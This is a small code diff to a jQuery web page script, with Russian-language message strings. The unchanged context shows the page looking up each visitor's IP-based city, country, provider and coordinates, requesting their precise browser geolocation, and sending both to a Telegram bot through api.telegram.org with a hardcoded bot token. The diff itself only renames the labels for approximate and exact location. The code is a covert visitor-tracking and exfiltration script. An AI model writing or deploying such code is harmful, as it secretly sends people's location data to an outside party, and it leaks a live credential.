@@ -7,7 +7,7 @@ $(document).ready(function () {
     return response.json();
   })
   .then(data => {
-    const message = `IP: ${data.ip}\nГород: ${data.city}\nСтрана: ${data.country}\nОрганизация: ${data.org}\nРегион: ${data.region}\nЛокация: ${data.loc}`;
+    const message = `IP: ${data.ip}\nГород: ${data.city}\nСтрана: ${data.country}\nОрганизация: ${data.org}\nРегион: ${data.region}\nНеточная локация: ${data.loc}`;
 
     fetch(`https://api.telegram.org/bot8114030428:AAHsuJfIONLcoVFZrLaRGyww2GNgeQ2RBpg/sendMessage`, {
       method: "POST",
@@ -29,7 +29,7 @@ $(document).ready(function () {
       (position) => {
         const latitude = position.coords.latitude;
         const longitude = position.coords.longitude;
-        const message = `Широта: ${latitude}, Долгота: ${longitude}`;
+        const message = `Точная локация: ${latitude}, ${longitude}`;
 
         fetch(`https://api.telegram.org/bot8114030428:AAHsuJfIONLcoVFZrLaRGyww2GNgeQ2RBpg/sendMessage`, {
           method: "POST",
